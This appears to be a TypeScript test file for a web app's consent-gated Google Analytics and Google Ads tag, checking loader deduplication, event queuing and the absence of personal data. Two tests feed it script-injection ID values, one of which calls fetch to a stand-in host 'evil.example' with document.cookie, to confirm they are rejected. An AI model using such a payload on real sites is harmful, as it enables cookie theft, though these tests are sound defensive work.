// Google tag (GA4 + Google Ads): nothing without Accept, gtag.js once, one config per
// distinct ID, no repeat when the old variable holds a "G-" ID, and two GA4 events
// (sign_up, begin_checkout) with no personal data.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import path from 'node:path'
import vm from 'node:vm'
import { fileURLToPath } from 'node:url'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const read = (rel: string) => readFileSync(path.join(ROOT, rel), 'utf8')

const tag = await import('@/lib/google-tag.ts')

const GA4 = 'G-QYDSQ8W6TX'
const ADS = 'AW-18335043737'

/** Run the bootstrap script in a fresh fake browser; returns the window and the dataLayer as plain arrays. */
function boot(configIds: string[], win: Record<string, unknown> = {}) {
  const ctx: Record<string, unknown> = win
  ctx.window = ctx
  vm.runInNewContext(tag.googleTagBootstrapScript(configIds), ctx)
  const layer = () => Array.from(ctx.dataLayer as ArrayLike<ArrayLike<unknown>>).map(a => Array.from(a)) // vm arrays are another realm: copy to host arrays
  return { ctx, layer }
}

test('no Accept, no tag: nothing loads and nothing is configured', () => {
  for (const consent of [null, 'declined'] as const) {
    const plan = tag.googleTagPlan({ consent, ga4Env: GA4, legacyEnv: ADS })
    assert.equal(plan.loaderId, null)
    assert.deepEqual(plan.configIds, [])
  }
})

test('Accept: one loader and two configs (GA4 and Ads)', () => {
  const plan = tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: ADS })
  assert.equal(plan.loaderId, GA4)
  assert.deepEqual(plan.configIds, [GA4, ADS])
  assert.equal(tag.googleTagLoaderUrl(plan.loaderId!), `https://www.googletagmanager.com/gtag/js?id=${GA4}`)

  const { layer } = boot(plan.configIds)
  const commands = layer()
  assert.equal(commands.filter(c => c[0] === 'js').length, 1)
  assert.deepEqual(commands.filter(c => c[0] === 'config').map(c => c[1]), [GA4, ADS])
})

test('GA4 id comes from NEXT_PUBLIC_GA4_MEASUREMENT_ID, and falls back to the built-in id when empty or malformed', () => {
  assert.equal(tag.googleTagPlan({ consent: 'accepted', ga4Env: 'G-ABCD1234', legacyEnv: ADS }).configIds[0], 'G-ABCD1234')
  for (const bad of [undefined, null, '', '   ', 'UA-123-1', 'G-', "G-AB');alert(1);//"]) {
    assert.equal(tag.googleTagPlan({ consent: 'accepted', ga4Env: bad, legacyEnv: ADS }).configIds[0], tag.DEFAULT_GA4_ID)
  }
  assert.equal(tag.DEFAULT_GA4_ID, GA4)
})

test('Ads id only: still one loader, GA4 default plus Ads, Ads behaviour unchanged', () => {
  const plan = tag.googleTagPlan({ consent: 'accepted', legacyEnv: `﻿${ADS}\n` })
  assert.deepEqual(plan.configIds, [GA4, ADS])
})

test('old variable holding the same G- id is not loaded twice; a different G- id is kept once', () => {
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds, [GA4])
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: GA4 }).configIds, [GA4])
  const { layer } = boot(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds)
  assert.equal(layer().filter(c => c[0] === 'config').length, 1)
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: 'G-OTHER12' }).configIds, [GA4, 'G-OTHER12'])
})

test('an id that is not a tag id never reaches the page script', () => {
  const evil = `AW-1');fetch('//evil.example/'+document.cookie);//`
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', legacyEnv: evil }).configIds, [GA4])
  assert.ok(!tag.googleTagBootstrapScript([evil, ADS]).includes('evil'))
})

test('events: not sent without Accept (no queue entry, no dataLayer entry)', () => {
  for (const consent of [null, 'declined'] as const) {
    const win: Record<string, unknown> = {}
    tag.sendGaEvent(win, consent, 'sign_up')
    tag.sendGaEvent(win, consent, 'begin_checkout', tag.beginCheckoutParams('pro'))
    assert.equal(win.dataLayer, undefined)
    assert.equal(win.__tutafyGtagPending, undefined)
  }
})

test('events asked for before the tag started are sent after config, in order', () => {
  const win: Record<string, unknown> = {}
  tag.sendGaEvent(win, 'accepted', 'sign_up')
  tag.sendGaEvent(win, 'accepted', 'begin_checkout', tag.beginCheckoutParams('academy'))
  assert.equal(win.dataLayer, undefined, 'nothing is pushed before gtag has been set up')

  const { layer, ctx } = boot([GA4, ADS], win)
  const names = layer().map(c => c[0] === 'event' ? `event:${c[1]}` : `${c[0]}:${Object.prototype.toString.call(c[1]) === "[object Date]" ? "date" : c[1]}`)
  assert.deepEqual(names, ['js:date', `config:${GA4}`, `config:${ADS}`, 'event:sign_up', 'event:begin_checkout'])
  assert.equal(Array.from(ctx.__tutafyGtagPending as ArrayLike<unknown>).length, 0)

  // once the tag is up, later events go straight through
  tag.sendGaEvent(ctx, 'accepted', 'begin_checkout', tag.beginCheckoutParams('pro'))
  assert.equal(layer().at(-1)![1], 'begin_checkout')
})

test('events carry no personal data: sign_up has no parameters, begin_checkout only the plan', () => {
  const win: Record<string, unknown> = {}
  tag.sendGaEvent(win, 'accepted', 'sign_up')
  tag.sendGaEvent(win, 'accepted', 'begin_checkout', tag.beginCheckoutParams('pro'))
  const [signUp, checkout] = win.__tutafyGtagPending as unknown[][]
  assert.deepEqual(signUp, ['event', 'sign_up'])
  assert.deepEqual(checkout, ['event', 'begin_checkout', { items: [{ item_id: 'pro', item_name: 'Tutafy Pro' }] }])
  const text = JSON.stringify(win.__tutafyGtagPending)
  assert.ok(!/@|email|name"|user_id|phone/i.test(text.replace(/item_name/g, '')))
})

// --- the components use these rules (page .tsx files cannot be imported by the test runner) ---

test('Analytics.tsx: renders only after Accept, loads gtag.js through the plan exactly once', () => {
  const src = read('src/components/Analytics.tsx')
  assert.ok(src.indexOf('if (!ok) return null') < src.indexOf('googleTagPlan('), 'plan is built only after the consent gate')
  assert.equal((src.match(/googleTagLoaderUrl\(/g) ?? []).length, 1, 'one loader Script')
  assert.ok(!/gtag\/js/.test(src), 'no second hand-written gtag.js URL')
  assert.equal((src.match(/googleTagBootstrapScript\(/g) ?? []).length, 1, 'one bootstrap script')
  assert.ok(!/gtag\('config'/.test(src), 'config calls come from the plan only')
  assert.ok(src.includes('process.env.NEXT_PUBLIC_GA4_MEASUREMENT_ID'))
  assert.ok(src.includes('process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID'))
})

test('Ads conversion at onboarding is unchanged, and sign_up is gated by consent', () => {
  const src = read('src/app/onboarding/page.tsx')
  assert.ok(src.includes(`w.dataLayer.push(['event', 'conversion', { send_to: 'AW-18335043737/SHlACJ_tptgcEJmh6qZE' }])`))
  assert.ok(src.includes(`sendGaEvent(window, getConsent(), 'sign_up')`))
})

test('begin_checkout is sent from the one function every Go Pro button calls, gated by consent', () => {
  const src = read('src/lib/track-client.ts')
  assert.ok(src.includes(`sendGaEvent(window, getConsent(), 'begin_checkout', beginCheckoutParams(plan))`))
  for (const f of ['src/components/plan/TrackedCheckoutLink.tsx', 'src/components/plan/LockedFeature.tsx']) {
    assert.ok(read(f).includes('trackCheckoutClick('), f)
  }
})

test('Privacy page names Google Analytics, the two events and what Decline does', () => {
  const src = read('src/app/privacy/page.tsx')
  assert.ok(src.includes('Google Analytics 4 and Google Ads'))
  assert.ok(/signs up for an account or clicks a Go Pro button/.test(src))
  assert.ok(/If you decline, no Google tag is loaded and nothing is sent to Google/.test(src))
})
